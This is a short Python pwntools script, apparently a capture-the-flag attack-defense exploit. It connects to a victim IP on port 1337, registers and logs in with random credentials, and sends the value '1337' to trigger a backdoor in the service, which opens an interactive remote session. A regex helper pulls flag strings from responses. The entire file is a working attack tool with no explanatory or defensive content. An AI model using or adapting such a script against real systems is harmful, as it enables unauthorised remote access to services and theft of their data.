#!/usr/bin/env python3

from pwn import *
import random
import string
import re
import sys

# elf = ELF("./task.elf")
# libc = ELF("./libc.so.6")

port = 1337
flag_regexp = re.compile(r'[A-Z0-9]{31}=')


class Hacker:
	def __init__(self, ip):
		self.s = remote(ip, port)
		# s = process(["./ld-linux.so.2", elf.path], env={"LD_PRELOAD":"./libc.so.6"})
		# s = process(elf.path)

		random_string = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))
		self.username = random_string
		self.password = random_string

		self.register()


	def register(self):
		# register
		self.s.sendline(b'2')
		self.s.sendline(self.username.encode())
		self.s.sendline(self.password.encode())

		# login
		self.s.sendline(self.username.encode())
		self.s.sendline(self.password.encode())


	def backdoor(self):
		self.s.sendline(b'1337')
		self.s.interactive()


	def find_flags_bytes(self, byte_s: bytes):
		print( flag_regexp.findall(byte_s.decode()), flush=True )


def main():

	try:
		ip = sys.argv[1]
	except:
		print(f"USAGE:\t{sys.argv[0]} <victim-ip-address>")
		sys.exit(1)

	back_user = Hacker(ip)
	back_user.backdoor()

	# back_user.find_flags(resp)


if __name__=="__main__":
	main()